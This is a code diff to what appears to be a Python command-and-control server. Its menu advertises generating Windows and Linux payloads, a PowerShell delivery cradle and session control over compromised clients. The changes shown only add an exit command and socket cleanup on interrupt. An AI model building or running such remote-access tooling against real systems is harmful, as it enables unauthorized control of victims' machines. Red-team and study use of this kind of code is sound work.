@@ -13,7 +13,7 @@ from Cryptodome.Util.Padding import pad
 import base64
 
 def help():
-    print("MENU COMMANDS \n ---------------------------------------\n listener -g : Generate a new listener\n winclient.py - Generate a Windows compatible client\n linclient.py - Generate a Linux compatible payload\n execlient - Generate an executable payload for Windows\n pshell_cradle : Commands to send encrypted payload to Windows clients\n sessions -l : List sessions\n session -i <session number> : Enter the required session\n kill <session number> : Kill an active session\n \n")
+    print("MENU COMMANDS \n ---------------------------------------\n listener -g : Generate a new listener\n winclient.py - Generate a Windows compatible client\n linclient.py - Generate a Linux compatible payload\n execlient - Generate an executable payload for Windows\n pshell_cradle : Commands to send encrypted payload to Windows clients\n sessions -l : List sessions\n session -i <session number> : Enter the required session\n kill <session number> : Kill an active session\n exit : Exit the code \n")
     print("SESSION COMMANDS \n ---------------------------------------\n background : Backgrounds the current session\n exit : Terminated the current session\n")
 def kill_sig(conn,msg):
     msg = str(msg)
@@ -139,6 +139,8 @@ def conn_handler():
             else:
                 plat_val = 0
             a.append([conn,addr[0],username,admin_val,plat_val,'Active'])
+        except KeyboardInterrupt:
+            sock.close()
         except:
             pass
 
@@ -226,9 +228,11 @@ def listener_handler():
     sock.bind((host_ip, int(host_port)))
     print('listening for connection')
     sock.listen()
-    t1 = threading.Thread(target=conn_handler)
-    t1.start()
-
+    try:
+        t1 = threading.Thread(target=conn_handler)
+        t1.start()
+    except KeyboardInterrupt:
+        sock.close()
 if __name__=='__main__':
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     a = []
@@ -294,6 +298,20 @@ if __name__=='__main__':
                     print(f'Terminated session {num}')
                 except (IndexError,ValueError):
                     print(f"Session {num} not found")
+            if command == "exit":
+                quit_msg=input("Do you want to quit?\n Press Y if Yes and N if No : ")
+                if quit_msg.lower()=='y':
+                    for target in a:
+                        if target[5] == "Dead":
+                            pass
+                        else:
+                            conn_out(target[0], "exit")
+                    kill_flag=1
+                    if listener_count > 0:
+                        sock.close()
+                    break
+                else : 
+                    continue
         except KeyboardInterrupt:
             print("\n Keyboard interrupt issued")
             quit_msg=input("Do you want to quit?\n Press Y if Yes and N if No : ")
